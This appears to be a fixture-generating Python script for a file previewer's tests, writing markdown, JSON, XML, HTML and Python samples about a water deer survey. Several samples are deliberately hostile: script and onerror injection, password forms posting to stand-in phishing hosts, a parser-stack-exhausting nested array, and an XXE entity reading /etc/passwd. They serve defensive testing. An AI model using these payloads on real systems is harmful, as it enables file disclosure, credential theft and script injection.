# Copyright 2026- Seongwoo Hong. All rights reserved.
"""
The text reader's fixtures (commit 42f, docs/PREVIEWS.md › Text). Run:

    python3 -I tests/fixtures/preview/texts.py tests/fixtures/preview

readme.md     Markdown with everything a page can carry: a table, code, a
              link, a picture from outside (a tracking pixel), a relative
              one, and raw HTML — a script, an onerror, a form, a frame.
              Rendered, it shows the words and none of the rest.
data.json     a nested object (Korean in it), for the tree and its paths.
deep.json     600 arrays inside each other: refused before JSON.parse
              (a parser's stack is what it attacks).
events.jsonl  three records and one line that is not JSON.
config.xml    an ordinary XML file: elements, attributes, a comment.
xxe.xml       an outside entity (XXE) and an internal one: never parsed.
page.html     a phishing page: a password form posting away, a script,
              a frame, a picture from outside. Shown as source, only.
app.py        honest Python, for highlighting: it warns of nothing.

The hostile scripts and the secrets are NOT here: they are built when the
tests run (tests/lib/hostile-text.mjs), so this repository holds no file a
virus scanner or a secret scanner would flag.
"""

import sys
from pathlib import Path

out = Path(sys.argv[1] if len(sys.argv) > 1 else ".")


def w(name: str, text: str) -> None:
    (out / name).write_bytes(text.encode("utf-8"))


w("readme.md", """# Gorani field notes

A water deer (**고라니**) survey, with a [link to the map](https://maps.example/gorani).

| Site | Count |
| ---- | ----: |
| North ridge | 12 |
| River bend | 7 |

```python
print("counted")
```

![tracking pixel](https://tracker.example/pixel.png?id=42)
![a relative picture](photos/deer.jpg)

<script>alert('md script')</script>
<img src=x onerror="alert('md onerror')">
<form action="https://phish.example/collect"><input type="password" name="pw"></form>
<iframe src="https://evil.example/frame"></iframe>

The end of the notes.
""")

w("data.json", """{
  "survey": "gorani",
  "sites": [
    { "name": "North ridge", "count": 12, "seen": true },
    { "name": "강가", "count": 7, "seen": false, "notes": null }
  ],
  "meta": { "version": 3, "tags": ["deer", "고라니"], "odd key": 1 }
}
""")

w("deep.json", "[" * 600 + "]" * 600 + "\n")

w("events.jsonl", """{"at":"2026-10-01T09:00:00Z","event":"login","user":"rin"}
{"at":"2026-10-01T09:05:00Z","event":"upload","user":"rin"}
this line is not JSON
{"at":"2026-10-01T09:07:00Z","event":"logout","user":"rin"}
""")

w("config.xml", """<?xml version="1.0" encoding="UTF-8"?>
<!-- the survey's settings -->
<settings version="3">
  <site id="north" name="North ridge"><count>12</count></site>
  <site id="river" name="강가"><count>7</count></site>
  <owner>Gorani tests</owner>
</settings>
""")

w("xxe.xml", """<?xml version="1.0"?>
<!DOCTYPE report [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY lol "lol">
]>
<report><body>&xxe; &lol;</body></report>
""")

w("page.html", """<!doctype html>
<html><head><title>Sign in to continue</title>
<script>document.title = 'ran';</script></head>
<body onload="steal()">
<h1>Your mailbox is full</h1>
<img src="https://phish.example/logo.png">
<form action="https://phish.example/login" method="post">
  <input name="user"><input type="password" name="pw"><button>Sign in</button>
</form>
<iframe src="https://phish.example/frame"></iframe>
<a href="https://phish.example/reset">Reset</a>
</body></html>
""")

w("app.py", '''"""Count the deer."""

from dataclasses import dataclass


@dataclass
class Site:
    name: str
    count: int


def total(sites: list[Site]) -> int:
    # 고라니, counted
    return sum(s.count for s in sites)


if __name__ == "__main__":
    print(total([Site("North ridge", 12), Site("강가", 7)]))
''')
